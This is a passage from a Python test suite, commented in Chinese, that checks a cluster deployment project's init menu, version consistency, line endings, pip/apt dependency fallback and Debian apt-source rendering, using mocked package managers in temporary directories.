        log_pass(f"init.sh 交互基础函数齐全（{len(need_fns)} 个）")

    # 5) 主菜单功能项齐全
    need_menus = ["部署 Panel 控制面板", "部署节点", "节点维护", "配置与分发", "服务安装", "环境自检"]
    missing_menus = [m for m in need_menus if m not in src]
    if missing_menus:
        log_fail(f"init.sh 主菜单缺少功能项: {missing_menus}")
    else:
        log_pass(f"init.sh 主菜单覆盖 {len(need_menus)} 项核心功能")

    # 6) 引用的 scripts/*.sh 必须真实存在（避免菜单点进去才发现脚本没了）
    refs = sorted(set(re.findall(r'\$\{SCRIPTS_DIR\}/([A-Za-z0-9_.\-]+\.sh)', src)))
    missing_refs = [r for r in refs if not (SCRIPTS_DIR / r).exists()]
    if not refs:
        log_fail("init.sh 未引用任何 scripts/ 脚本")
    elif missing_refs:
        log_fail(f"init.sh 引用了不存在的脚本: {missing_refs}")
    else:
        log_pass(f"init.sh 引用的 {len(refs)} 个 scripts/ 脚本均存在")

    # 7) 面板安装复用既有实现，不重复造 unit
    if "${PANEL_DIR}/install-service.sh" in src and (PANEL_DIR / "install-service.sh").exists():
        log_pass("面板 systemd 安装复用 panel/install-service.sh（未重复实现）")
    else:
        log_fail("面板 systemd 安装未复用 panel/install-service.sh")

    # 8) 不硬编码集群节点 IP（统一走 lib-nodes.sh）
    real_ips = [ip for ip in load_node_ip_map().values() if ip]
    hard = [ip for ip in real_ips if ip in src]
    if hard:
        log_fail(f"init.sh 硬编码了节点 IP: {hard}", "应统一从 lib-nodes.sh 读取")
    else:
        log_pass("init.sh 未硬编码节点 IP（统一走 lib-nodes.sh）")

    # 9) 文档登记
    if init_readme.exists():
        log_pass("init/README.md 存在")
    else:
        log_fail("init/README.md 缺失")

    root_readme = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
    if "init/init.sh" in root_readme and "init/README.md" in root_readme:
        log_pass("根 README 已登记 init 入口与文档链接")
    else:
        log_fail("根 README 未登记 init 入口", "新目录需要在根 README 可见")


# ============ 测试19: 交付物一致性 ============
def test_delivery_consistency():
    """测试 19: 版本声明一致 / 行尾防护 / 面板监听参数可注入 / 表格排版"""
    print("\n" + "="*60)
    print("测试 19: 交付物一致性")
    print("="*60)

    # 1) 版本声明四处一致 (历史上出现过 README 与 config.json 漂移)
    versions = {}

    readme = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
    m = re.search(r'当前版本:\s*v?([0-9]+\.[0-9]+\.[0-9]+)', readme)
    if m:
        versions["README.md"] = m.group(1)

    try:
        cfg = json.loads((PANEL_DIR / "config.json").read_text(encoding="utf-8"))
        versions["panel/config.json"] = str(cfg.get("version", ""))
    except Exception as e:
        log_fail(f"panel/config.json 读取失败: {e}")

    app_src = (PANEL_DIR / "app.py").read_text(encoding="utf-8")
    m = re.search(r'"version":\s*"([0-9]+\.[0-9]+\.[0-9]+)"', app_src)
    if m:
        versions["panel/app.py"] = m.group(1)

    gen_src = (SCRIPTS_DIR / "gen-panel-config.sh").read_text(encoding="utf-8")
    m = re.search(r'ONECLOUD_PANEL_VERSION:-([0-9]+\.[0-9]+\.[0-9]+)', gen_src)
    if m:
        versions["gen-panel-config.sh"] = m.group(1)

    if len(versions) == 4 and len(set(versions.values())) == 1:
        log_pass(f"版本声明四处一致（{list(versions.values())[0]}）")
    else:
        log_fail(f"版本声明不一致: {versions}", "README / config.json / app.py / 生成脚本须同步")

    if len(versions) == 4:
        log_pass("版本号可从 README / config.json / app.py / 生成脚本四处解析到")
    else:
        log_fail(f"版本号解析不全: {sorted(versions.keys())}")

    # 2) .gitattributes: 锁定 LF, 防止 Windows checkout 出 CRLF 导致 bad interpreter
    ga = PROJECT_ROOT / ".gitattributes"
    if ga.exists():
        log_pass(".gitattributes 存在")
        ga_src = ga.read_text(encoding="utf-8")
        if re.search(r'\*[ \t]+text=auto[ \t]+eol=lf', ga_src):
            log_pass(".gitattributes 声明 * text=auto eol=lf")
        else:
            log_fail(".gitattributes 未声明 * text=auto eol=lf")
        if re.search(r'\*\.sh[ \t]+text[ \t]+eol=lf', ga_src):
            log_pass(".gitattributes 显式声明 *.sh eol=lf")
        else:
            log_fail(".gitattributes 未显式声明 *.sh eol=lf")
        if re.search(r'\*\.(png|gz|zip|deb|woff2?)\s+binary', ga_src):
            log_pass(".gitattributes 对二进制文件声明 binary（不做行尾转换）")
        else:
            log_fail(".gitattributes 未保护二进制文件")
    else:
        log_fail(".gitattributes 缺失", "Windows 工作区会被 checkout 成 CRLF")

    # 3) 实际行尾: 工作区 shell 脚本不得含 CR
    cr_scripts = []
    for sh in sorted(PROJECT_ROOT.rglob("*.sh")):
        if ".git" in sh.parts:
            continue
        try:
            if b"\r" in sh.read_bytes():
                cr_scripts.append(str(sh.relative_to(PROJECT_ROOT)).replace("\\", "/"))
        except OSError:
            pass
        if len(cr_scripts) >= 5:
            break
    if cr_scripts:
        log_fail(f"工作区 shell 脚本含 CRLF: {cr_scripts[:5]}",
                 "CRLF 会导致 bad interpreter 与变量尾部混入 \\r")
    else:
        log_pass("工作区全部 shell 脚本均为 LF 行尾")

    # 4) 面板监听参数必须可注入 (不能写死在 unit 模板里)
    inst = (PANEL_DIR / "install-service.sh").read_text(encoding="utf-8")
    if 'PANEL_PORT="${PANEL_PORT:-' in inst and 'PANEL_HOST="${PANEL_HOST:-' in inst:
        log_pass("install-service.sh 监听端口/地址来自环境变量（含默认值）")
    else:
        log_fail("install-service.sh 仍硬编码监听端口/地址",
                 "自定义端口会退化为依赖 drop-in 覆盖顺序")

    if "Environment=PANEL_PORT=${PANEL_PORT}" in inst and "Environment=PANEL_HOST=${PANEL_HOST}" in inst:
        log_pass("unit 中的 Environment= 使用注入值而非字面量")
    else:
        log_fail("unit 中 Environment= 未使用注入值")

    init_src = (PROJECT_ROOT / "init" / "init.sh").read_text(encoding="utf-8")
    if "env PANEL_HOST=" in init_src and "PANEL_PORT=" in init_src:
        log_pass("init.sh 安装面板服务时注入 PANEL_HOST/PANEL_PORT（用 env 规避 sudo env_reset）")
    else:
        log_fail("init.sh 未向 install-service.sh 注入监听参数")

    # 5) 中文表头不得使用 %-Ns 按字节填充
    # 判据: printf 的「实参」里出现中文字面量, 且格式串含 %-Ns
    #   printf "  %-16s %s\n" "名称" "IP"      -> 实参有中文, 会被按字节填充 => 反模式
    #   printf "  %-24s (无固定端口)\n" "$name" -> 中文在格式串, 填充的是 ASCII 变量 => 正常
    def _cjk_printf_smell(line):
        m = re.search(r'printf\s+(?:"([^"]*)"|\'([^\']*)\'|([^\s]+))', line)
        if not m:
            return False
        fmt = next((g for g in m.groups() if g is not None), "")
        rest = line[m.end():]
        return bool(re.search(r'%-\d+s', fmt) and re.search(r'[\u4e00-\u9fff]', rest))

    bad_tables = []
    for sh in sorted(SCRIPTS_DIR.glob("*.sh")) + [PROJECT_ROOT / "init" / "init.sh"]:
        if not sh.exists():
            continue
        for ln_no, ln in enumerate(sh.read_text(encoding="utf-8").splitlines(), 1):
            if ln.lstrip().startswith("#"):
                continue
            if _cjk_printf_smell(ln):
                bad_tables.append(f"{sh.name}:{ln_no}")
    if bad_tables:
        log_fail(f"printf 实参含中文且格式串有 %-Ns（按字节填充会错位）: {bad_tables[:5]}")
    else:
        log_pass("无「printf 实参含中文 + %-Ns」的按字节填充写法")


def test_pydeps_fallback():
    """测试 20: Python 依赖安装的降级链 (pip 缺失场景)"""
    print("\n" + "=" * 60)
    print("测试 20: Python 依赖降级链 (lib-pydeps.sh)")
    print("=" * 60)

    lib = SCRIPTS_DIR / "lib-pydeps.sh"
    if not lib.exists():
        log_fail("scripts/lib-pydeps.sh 缺失")
        return
    lsrc = lib.read_text(encoding="utf-8")

    # ---- 静态断言 ----
    needed = ["pydeps_pip_usable", "pydeps_try_ensurepip", "pydeps_try_apt_pip",
              "pydeps_try_getpip", "pydeps_try_apt_pkgs", "pydeps_verify",
              "pydeps_install", "pydeps_install_from_file"]
    missing = [n for n in needed if f"{n}()" not in lsrc]
    if not missing:
        log_pass("lib-pydeps.sh 具备完整降级链函数")
    else:
        log_fail(f"lib-pydeps.sh 缺少函数: {missing}")

    if 'python3-flask-cors' in lsrc and 'python3-flask' in lsrc:
        log_pass("具备发行版包 (apt) 兜底映射")
    else:
        log_fail("缺少 apt 包名映射", "pip 不可用时无法兜底")

    # 调用方必须复用同一实现, 不得再各自拼 pip 命令
    dup = []
    for sh in [PROJECT_ROOT / "init" / "init.sh", SCRIPTS_DIR / "setup.sh",
               SCRIPTS_DIR / "install-services.sh", SCRIPTS_DIR / "lib-pydeps.sh"]:
        if not sh.exists():
            continue
        if sh.name == "lib-pydeps.sh":
            continue
        for ln_no, ln in enumerate(sh.read_text(encoding="utf-8").splitlines(), 1):
            s = ln.strip()
            if s.startswith("#"):
                continue
            if re.search(r'(^|\s|\|)pip3\s+install', ln):
                dup.append(f"{sh.name}:{ln_no}")
    if not dup:
        log_pass("无脚本再直接调用裸 pip3 (统一走 lib-pydeps.sh)")
    else:
        log_fail(f"仍有裸 pip3 调用: {dup[:4]}", "pip 缺失时会 command not found")

    # init.sh 必须 source 该库
    isrc = (PROJECT_ROOT / "init" / "init.sh").read_text(encoding="utf-8")
    if "lib-pydeps.sh" in isrc and "panel_install_deps" in isrc:
        log_pass("init.sh 已接入 lib-pydeps.sh")
    else:
        log_fail("init.sh 未接入 lib-pydeps.sh")

    # 关键: panel_install_deps 不能只靠 --break-system-packages 救场
    if "pydeps_pip_usable" in isrc and "python3-pip" in isrc:
        log_pass("init.sh 会先检测 pip 是否可用, 并具备补齐路径")
    else:
        log_fail("init.sh 未检测 pip 可用性",
                 "--break-system-packages 补不了缺失的 pip 自身")

    # ---- 行为验证: 用 mock 解释器/包管理器跑真实降级链 ----
    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t20_"))
    harness = tmpdir / "harness.sh"

    tmpl = r'''#!/bin/bash
set -u
LIB="__LIB__"
ROOT="__ROOT__"
M="$ROOT/mockbin"
mkdir -p "$M"

cat > "$M/python3" << 'PYMOCK'
#!/bin/bash
SD="${MOCK_STATE:-/tmp/nostate}"
log() { printf '%s\n' "$*" >> "$SD/calls"; }
mod_of() { printf '%s' "$1" | tr '-' '_'; }
case "${1:-}" in
  -m)
    shift
    case "${1:-}" in
      pip)
        shift
        if [ ! -f "$SD/pip" ]; then echo "No module named pip" >&2; exit 1; fi
        case "${1:-}" in
          --version) echo "pip 24.0"; exit 0 ;;
          install)
            shift
            brk=0; args=""
            for a in "$@"; do
              if [ "$a" = "--break-system-packages" ]; then brk=1; continue; fi
              case "$a" in -*) continue ;; esac
              args="$args $a"
            done
            if [ "$brk" = "1" ]; then
              log "pip install --break-system-packages$args"
              [ "${S_break:-0}" = "1" ] || { echo "error" >&2; exit 1; }
            else
              log "pip install$args"
              [ "${S_plain:-0}" = "1" ] || { echo "externally-managed-environment" >&2; exit 1; }
            fi
            if [ "${S_touch:-1}" = "1" ]; then
              for a in $args; do : > "$SD/inst_$(mod_of "$a")"; done
            fi
            exit 0
            ;;
        esac
        exit 1
        ;;
      ensurepip)
        log "ensurepip"
        if [ "${S_ensurepip:-0}" = "1" ]; then : > "$SD/pip"; exit 0; fi
        echo "No module named ensurepip" >&2
        exit 1
        ;;
    esac
    exit 1
    ;;
  -c)
    mods="$(printf '%s' "${2:-}" | sed -e 's/^import //' -e 's/,/ /g')"
    for m in $mods; do [ -f "$SD/inst_$m" ] || exit 1; done
    exit 0
    ;;
esac
exit 1
PYMOCK

cat > "$M/apt-get" << 'APTMOCK'
#!/bin/bash
SD="${MOCK_STATE:-/tmp/nostate}"
[ "${1:-}" = "update" ] && exit 0
[ "${1:-}" = "install" ] || exit 1
shift
pkgs=""
for a in "$@"; do
  case "$a" in -*) continue ;; esac
  pkgs="$pkgs $a"
done
printf 'apt-get install%s\n' "$pkgs" >> "$SD/calls"
for p in $pkgs; do
  if [ "$p" = "python3-pip" ]; then
    if [ "${S_apt_pip:-0}" = "1" ]; then : > "$SD/pip"; else exit 1; fi
    continue
  fi
  case " ${S_avail:-} " in
    *" $p "*) : > "$SD/inst_$(printf '%s' "$p" | sed -e 's/^python3-//' -e 's/-/_/g')" ;;
    *) exit 1 ;;
  esac
done
exit 0
APTMOCK

# 断网: 让 get-pip.py 兜底快速失败, 保证测试确定性
printf '#!/bin/bash\nexit 1\n' > "$M/curl"
cp "$M/curl" "$M/wget"
chmod +x "$M"/*

scenario() {
    local name="$1" plain="$2" brk="$3" ens="$4" aptpip="$5" avail="$6" touch="$7" pre="$8"
    local SC="$ROOT/$name"
    mkdir -p "$SC"          # ROOT 由 mktemp 新建, 每个 SC 都是全新目录, 无需 rm
    local p
    for p in $pre; do : > "$SC/inst_$p"; done
    [ "${9:-0}" = "1" ] && : > "$SC/pip"
    echo "###CASE:$name"
    # 固定 PATH: 只留本仓 mock 与系统工具。宿主 shell 会往 PATH 注入
    # rm 安全 shim, 而这类 shim 会对 rm -rf 发起确认并挂起, 必须绕开。
    MOCK_STATE="$SC" S_plain="$plain" S_break="$brk" S_ensurepip="$ens" \
    S_apt_pip="$aptpip" S_avail="$avail" S_touch="$touch" \
    PATH="$M:/usr/bin:/bin" \
        bash -c '
            source "$0"
            pydeps_install "$1" "flask flask-cors" ""
            rc=$?
            echo "RC=$rc"
            if [ "$rc" != "0" ]; then pydeps_hint "flask flask-cors" "$1" ""; fi
        ' "$LIB" python3 2>&1 | sed 's/^/    /'
    echo "    CALLS: $(cat "$SC/calls" 2>/dev/null | tr '\n' '|')"
}

scenario already_ok   0 0 0 0 ""                 1 "flask flask_cors" 0
scenario pip_plain    1 0 0 0 ""                 1 "" 1
scenario pep668       0 1 0 0 ""                 1 "" 1
scenario via_ensure   1 0 1 0 ""                 1 "" 0
scenario via_apt_pip  0 1 0 1 ""                 1 "" 0
scenario via_apt_pkg  0 0 0 0 "python3-flask python3-flask-cors" 1 "" 0
scenario all_fail     0 0 0 0 ""                 1 "" 0
scenario pip_lied     1 0 0 0 "python3-flask python3-flask-cors" 0 "" 1
'''
    harness.write_text(
        tmpl.replace("__LIB__", _posix(lib)).replace("__ROOT__", _posix(tmpdir)),
        encoding="utf-8")

    try:
        r = subprocess.run(["bash", str(harness)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=240)
        out = r.stdout

        def case(tag):
            m = re.search(rf"###CASE:{tag}\n(.*?)(?=\n###CASE:|\Z)", out, re.S)
            return m.group(1) if m else ""

        checks = [
            ("pip_plain", "RC=0", "pip install flask flask-cors", "常规 pip 路线"),
            ("pep668", "RC=0", "pip install --break-system-packages flask flask-cors",
             "PEP 668 时自动加 --break-system-packages"),
            ("via_ensure", "RC=0", "ensurepip", "ensurepip 补齐 pip"),
            ("via_apt_pip", "RC=0", "apt-get install python3-pip",
             "pip 缺失时用 apt 补齐 python3-pip"),
            ("via_apt_pkg", "RC=0", "apt-get install python3-flask python3-flask-cors",
             "pip 完全不可用时改走发行版包"),
            ("all_fail", "RC=1", "--break-system-packages flask", "彻底失败时给出手工命令"),
            ("pip_lied", "RC=0", "apt-get install python3-flask", "pip 谎报成功时靠 import 校验兜住"),
        ]
        for tag, want_rc, want_call, desc in checks:
            c = case(tag)
            ok = want_rc in c and want_call in c
            if ok:
                log_pass(desc)
            else:
                log_fail(f"{desc} —— 用例 {tag} 不符合预期",
                         f"缺 [{want_rc}] 或 [{want_call}]; 实际: {c.strip()[:180]}")

        # 依赖已齐时必须完全不动包管理器
        c = case("already_ok")
        if "依赖已就绪" in c and "pip install" not in c and "apt-get" not in c:
            log_pass("依赖已齐时直接返回, 不调用 pip/apt")
        else:
            log_fail("依赖已齐时仍调用了包管理器", c.strip()[:180])

        # via_apt_pip 场景不得退回装发行版包 (顺序必须是先补 pip)
        c = case("via_apt_pip")
        if "apt-get install python3-flask" not in c:
            log_pass("补齐 pip 成功后不再多装发行版包 (降级顺序正确)")
        else:
            log_fail("补齐 pip 后仍安装了发行版包", "降级顺序不符预期")

        # all_fail 必须给出可复制的手工命令
        c = case("all_fail")
        if "pip install --break-system-packages" in c and "apt-get install -y python3-flask" in c:
            log_pass("失败提示含 pip 与 apt 两条可复制命令")
        else:
            log_fail("失败提示缺少可复制命令", c.strip()[:180])
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 测试21: bootstrap apt 源与依赖安装回归 ============
def test_bootstrap_apt_sources():
    """测试 21: apt 源按系统代号渲染 / apt 失败诊断 / wireguard-dkms 条件安装

    背景: 老实现把 sources.list 写死成 bullseye, 且在基础工具里无条件安装
    wireguard-dkms。Debian 12 已移除该包, apt 会以退出码 100 失败, 又被
    set -e 原样透传出去, 现场只看到一个裸 100, 无法定位。
    """
    print("\n" + "=" * 60)
    print("测试 21: bootstrap apt 源与依赖安装回归")
    print("=" * 60)

    boot = SCRIPTS_DIR / "bootstrap.sh"
    if not boot.exists():
        log_fail("scripts/bootstrap.sh 缺失")
        return
    src = boot.read_text(encoding="utf-8")
    lines = src.splitlines()

    # ---- 1) 静态检查: 不允许再写死 bullseye / 不允许无条件装 dkms ----
    if re.search(r"deb\s+https?://\S+\s+bullseye\s", src):
        log_fail("bootstrap.sh 仍写死 bullseye 源", "Debian 12 机器会被写入错误代号")
    else:
        log_pass("apt 源不再写死 bullseye (按系统代号渲染)")

    if "wireguard-tools wireguard-dkms" in src:
        log_fail("基础工具仍无条件安装 wireguard-dkms", "Debian 12 起该包已移除 -> apt 退出 100")
    else:
        log_pass("wireguard-dkms 不再出现在无条件安装列表")

    needed = ["detect_distro()", "apt_components_for()", "wireguard_kernel_builtin()",
              "configure_apt_sources()", "apt_run()", "apt_try()"]
    missing = [n for n in needed if n not in src]
    if not missing:
        log_pass("具备发行版探测 / 源写入 / apt 失败诊断等辅助函数")
    else:
        log_fail(f"缺少辅助函数: {missing}")

    if "apt-cache show wireguard-dkms" in src and "apt_run \"安装 wireguard-dkms\"" in src:
        log_pass("wireguard-dkms 改为按需安装 (仅源确实提供时)")
    else:
        log_fail("未实现 wireguard-dkms 按需安装")

    if "ONECLOUD_APT_SKIP_MIRROR" in src and "ONECLOUD_APT_MIRROR" in src:
        log_pass("提供换源逃生开关 (跳过/自定义镜像)")
    else:
        log_fail("缺少换源逃生开关", "镜像不可达时用户无法绕过")

    # ---- 2) 行为验证: 提取 helper 与步骤3~5 逐场景跑 mock ----
    i_log = next((i for i, l in enumerate(lines) if l.startswith("log_info()  {")), -1)
    i_net = next((i for i, l in enumerate(lines) if l.startswith("# 网段计算")), -1)
    i_s3 = next((i for i, l in enumerate(lines) if l.startswith("# ---- 3. 换国内源")), -1)
    i_s6 = next((i for i, l in enumerate(lines) if l.startswith("# ---- 6. 配置时区")), -1)
    if min(i_log, i_net, i_s3, i_s6) < 0:
        log_fail("无法在 bootstrap.sh 定位 helper / 步骤锚点",
                 "代码结构变了, 需同步更新本测试的锚点")
        return

    helpers = "\n".join(lines[i_log:i_net - 1])
    flow = "\n".join(lines[i_s3:i_s6])

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t21_"))
    mockbin = tmpdir / "mockbin"
    mockbin.mkdir()

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    mocks = {
        "apt": r"""#!/bin/bash
echo "apt $*" >> "$APT_LOG"
if [ "$1" = "update" ] && [ "$MOCK_FAIL_UPDATE" = "1" ]; then
    echo "E: Failed to fetch http://mirrors.tuna.tsinghua.edu.cn/debian/dists/bookworm/InRelease  502  Bad Gateway" >&2
    exit 100
fi
if [ "$1" = "upgrade" ] && [ "$MOCK_FAIL_UPGRADE" = "1" ]; then
    echo "E: Unable to correct problems, you have held broken packages." >&2
    exit 100
fi
for a in "$@"; do
    if [ "$a" = "wireguard-dkms" ] && [ "$MOCK_DKMS_INSTALL_FAIL" = "1" ]; then
        echo "E: Unable to locate package wireguard-dkms" >&2
        exit 100
    fi
done
exit 0
""",
        "apt-cache": r"""#!/bin/bash
echo "apt-cache $*" >> "$APT_LOG"
if [ "$1" = "show" ] && [ "$2" = "wireguard-dkms" ]; then
    if [ "$MOCK_DKMS_AVAILABLE" = "1" ]; then
        echo "Package: wireguard-dkms"
        exit 0
    fi
    echo "E: No packages found" >&2
    exit 100
fi
exit 0
""",
        "uname": r"""#!/bin/bash
[ "$1" = "-r" ] && { echo "$MOCK_KERNEL"; exit 0; }
echo Linux
exit 0
""",
    }
    for name, body in mocks.items():
        p = mockbin / name
        p.write_text(body, encoding="utf-8", newline="\n")
        os.chmod(p, 0o755)

    driver = r"""
# ---------------- driver ----------------
set +e
WORK="@WORK@"
M="@MOCK@"
PATH="$M:/usr/bin:/bin"
export PATH

run_case() {
    local tag="$1" id="$2" cn="$3" legacy="$4" deb822="$5"
    shift 5
    local root="$WORK/root_$tag"
    mkdir -p "$root/apt/sources.list.d"
    printf 'ID=%s\nVERSION_CODENAME=%s\n' "$id" "$cn" > "$root/os-release"
    if [ "$deb822" = "1" ]; then
        cat > "$root/apt/sources.list.d/debian.sources" <<'EOS'
Types: deb
URIs: http://deb.debian.org/debian
Suites: bookworm bookworm-updates
Components: main
Signed-By: /usr/share/keyrings/debian-archive-keyring.gpg
EOS
    fi
    if [ "$legacy" = "1" ]; then
        cat > "$root/apt/sources.list" <<'EOS'
deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bullseye main contrib non-free
deb https://mirrors.tuna.tsinghua.edu.cn/debian-security bullseye-security main contrib non-free
EOS
    fi
    export ONECLOUD_ETC_ROOT="$root"
    export APT_LOG="$WORK/apt_$tag.log"
    : > "$APT_LOG"
    export MOCK_FAIL_UPDATE=0 MOCK_FAIL_UPGRADE=0 MOCK_DKMS_AVAILABLE=0
    export MOCK_DKMS_INSTALL_FAIL=0 MOCK_KERNEL=5.10.63-rockchip
    unset ONECLOUD_APT_SKIP_MIRROR
    local kv
    for kv in "$@"; do export "$kv"; done
    ( set -e; step_apt_flow ) > "$WORK/out_$tag.txt" 2>&1
    echo "###RC:$tag:$?"
    echo "###OUT_BEGIN:$tag"
    cat "$WORK/out_$tag.txt"
    echo "###OUT_END:$tag"
    echo "###SOURCES_BEGIN:$tag"
    [ -f "$root/apt/sources.list" ] && cat "$root/apt/sources.list"
    [ -f "$root/apt/sources.list.d/debian.sources" ] && cat "$root/apt/sources.list.d/debian.sources"
    echo "###SOURCES_END:$tag"
    echo "###APTLOG_BEGIN:$tag"
    cat "$APT_LOG"
    echo "###APTLOG_END:$tag"
    echo "###BAK_BEGIN:$tag"
    [ -f "$root/apt/sources.list.onecloud.bak" ] && echo "sources.list.onecloud.bak"
    [ -f "$root/apt/sources.list.d/debian.sources.onecloud.bak" ] && echo "debian.sources.onecloud.bak"
    echo "###BAK_END:$tag"
}

run_case s1_bookworm_ok       debian bookworm 1 0
run_case s2_update_100        debian bookworm 1 0 MOCK_FAIL_UPDATE=1
run_case s3_upgrade_100       debian bookworm 1 0 MOCK_FAIL_UPGRADE=1
run_case s4_oldkern_nodkms    debian bookworm 1 0 MOCK_KERNEL=4.19.100-rockchip
run_case s5_oldkern_dkms      debian bookworm 1 0 MOCK_KERNEL=4.19.100-rockchip MOCK_DKMS_AVAILABLE=1
run_case s6_deb822            debian bookworm 1 1
run_case s7_ubuntu            ubuntu jammy    1 0
run_case s8_skip_mirror       debian bookworm 1 0 ONECLOUD_APT_SKIP_MIRROR=1
run_case s9_bullseye          debian bullseye 1 0
run_case s10_dkms_install_100 debian bookworm 1 0 MOCK_KERNEL=4.19.100-rockchip MOCK_DKMS_AVAILABLE=1 MOCK_DKMS_INSTALL_FAIL=1
echo "###DONE"
"""
    probe = tmpdir / "probe.sh"
    probe.write_text(
        helpers + "\n\nstep_apt_flow() {\n" + flow + "\n}\n" + driver
        .replace("@WORK@", _posix(tmpdir))
        .replace("@MOCK@", _posix(mockbin)),
        encoding="utf-8", newline="\n")

    try:
        r = subprocess.run(["bash", _posix(probe)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=420)
        out = r.stdout

        def sect(name, tag):
            m = re.search(rf"###{name}_BEGIN:{tag}\n(.*?)\n###{name}_END:{tag}", out, re.S)
            return (m.group(1) + "\n") if m else ""

        def rc(tag):
            m = re.search(rf"###RC:{tag}:(\d+)", out)
            return int(m.group(1)) if m else None

        if "###DONE" not in out:
            log_fail("mock 驱动未跑完", f"stderr={r.stderr[-300:]}")
            return

        # --- s1: 核心回归 (bookworm 机器 + 旧 bullseye 源残留) ---
        s1 = sect("SOURCES", "s1_bookworm_ok")
        c1 = sect("OUT", "s1_bookworm_ok")
        a1 = sect("APTLOG", "s1_bookworm_ok")
        if rc("s1_bookworm_ok") == 0:
            log_pass("bookworm 机器上初始化成功退出 (老实现此处 apt 100)")
        else:
            log_fail(f"bookworm 机器初始化退出码 {rc('s1_bookworm_ok')}")
        if "bookworm main contrib non-free non-free-firmware" in s1 and "bullseye" not in s1:
            log_pass("源按实际代号写成 bookworm (含 non-free-firmware), 无 bullseye 残留")
        else:
            log_fail("源代号或组件不正确", s1[:200])
        if "-updates" in s1 and "-backports" in s1 and "bookworm-security" in s1:
            log_pass("updates / backports / security 三类源齐全")
        else:
            log_fail("源条目不全", s1[:200])
        if "wireguard-tools" in a1 and "wireguard-dkms" not in a1:
            log_pass("基础工具装 wireguard-tools, 不再装 wireguard-dkms")
        else:
            log_fail("基础工具安装列表不正确", a1[:200])
        if "已内置 wireguard" in c1:
            log_pass("5.6+ 内核识别为内置 wireguard, 明确跳过 dkms")
        else:
            log_fail("未识别内置 wireguard 模块", c1[-200:])
        if "sources.list.onecloud.bak" in sect("BAK", "s1_bookworm_ok"):
            log_pass("改写前备份原 sources.list")
        else:
            log_fail("未备份原 sources.list", "出问题无法回滚")

        # --- s2: apt update 返回 100 ---
        c2 = sect("OUT", "s2_update_100")
        if rc("s2_update_100") == 100:
            log_pass("apt update 失败时退出码透传 100")
        else:
            log_fail(f"apt update 失败退出码异常: {rc('s2_update_100')}")
        if "apt 步骤失败" in c2 and "100 = apt/dpkg 处理失败" in c2:
            log_pass("失败时打印步骤名并解释 100 的含义")
        else:
            log_fail("未给出 100 的解释", c2[-300:])
        if "源文件:" in c2 and "系统代号" in c2:
            log_pass("给出源文件与系统代号等排查线索")
        else:
            log_fail("缺少排查线索")
        if "502  Bad Gateway" in c2:
            log_pass("保留 apt 原始报错 (不再只看到裸退出码)")
        else:
            log_fail("未保留 apt 原始输出")

        # --- s3: apt upgrade 失败不应中断 ---
        c3 = sect("OUT", "s3_upgrade_100")
        if rc("s3_upgrade_100") == 0:
            log_pass("apt upgrade 失败不致命, 不中断整机初始化")
        else:
            log_fail(f"升级失败导致整体退出 {rc('s3_upgrade_100')}", "主机名/源已改却什么都没配完")
        if "该步骤失败但继续" in c3:
            log_pass("升级失败时明确告警并继续")
        else:
            log_fail("升级失败未告警")
        if "apt install" in sect("APTLOG", "s3_upgrade_100"):
            log_pass("升级失败后仍继续安装基础工具")
        else:
            log_fail("升级失败后未继续安装基础工具")

        # --- s4/s5: 老内核下 dkms 按需安装 ---
        c4 = sect("OUT", "s4_oldkern_nodkms")
        a4 = sect("APTLOG", "s4_oldkern_nodkms").replace("apt-cache show wireguard-dkms", "")
        if rc("s4_oldkern_nodkms") == 0 and "不提供 wireguard-dkms" in c4 and "wireguard-dkms" not in a4:
            log_pass("老内核 + 源无该包: 跳过而非硬装 (这是 100 的根因)")
        else:
            log_fail("源不提供该包时未正确跳过", c4[-200:])
        a5 = sect("APTLOG", "s5_oldkern_dkms")
        if rc("s5_oldkern_dkms") == 0 and "install -y wireguard-dkms" in a5:
            log_pass("老内核 + 源提供该包: 按需安装")
        else:
            log_fail("应当按需安装时未安装", a5[:200])

        # --- s6: deb822 布局就地重写 ---
        s6 = sect("SOURCES", "s6_deb822")
        b6 = sect("BAK", "s6_deb822")
        if rc("s6_deb822") == 0 and "Suites: bookworm bookworm-updates bookworm-backports" in s6:
            log_pass("识别 deb822 源文件并就地重写为实际代号")
        else:
            log_fail("deb822 源未正确重写", s6[:250])
        active_bullseye = [ln for ln in s6.splitlines()
                           if "bullseye" in ln and not ln.startswith("# [onecloud-disabled]")]
        if "# [onecloud-disabled]" in s6 and not active_bullseye:
            log_pass("残留的 classic bullseye 源被注释, 不再有生效的重复源")
        else:
            log_fail("仍存在生效的 bullseye 源条目", str(active_bullseye)[:200])
        if "debian.sources.onecloud.bak" in b6 and "sources.list.onecloud.bak" in b6:
            log_pass("deb822 与 classic 源文件均留备份")
        else:
            log_fail("备份不完整", b6[:200])

        # --- s7/s8: 跳过换源的两种情况 ---
        s7 = sect("SOURCES", "s7_ubuntu")
        if rc("s7_ubuntu") == 0 and "非 Debian 系" in sect("OUT", "s7_ubuntu") \
                and "bullseye main contrib non-free" in s7:
            log_pass("非 Debian 系统跳过换源, 原源文件不被触碰")
        else:
            log_fail("非 Debian 系统处理不正确", s7[:200])
        s8 = sect("SOURCES", "s8_skip_mirror")
        if rc("s8_skip_mirror") == 0 and "跳过换源" in sect("OUT", "s8_skip_mirror") \
                and "bullseye main contrib non-free" in s8:
            log_pass("ONECLOUD_APT_SKIP_MIRROR=1 时完全不动源文件")
        else:
            log_fail("跳过换源开关未生效", s8[:200])

        # --- s9: bullseye 机器 ---
        s9 = sect("SOURCES", "s9_bullseye")
        if rc("s9_bullseye") == 0 and "bullseye main contrib non-free" in s9 \
                and "non-free-firmware" not in s9:
            log_pass("bullseye 机器按实际代号写入, 且不写它没有的组件")
        else:
            log_fail("bullseye 代号或组件处理不正确", s9[:250])

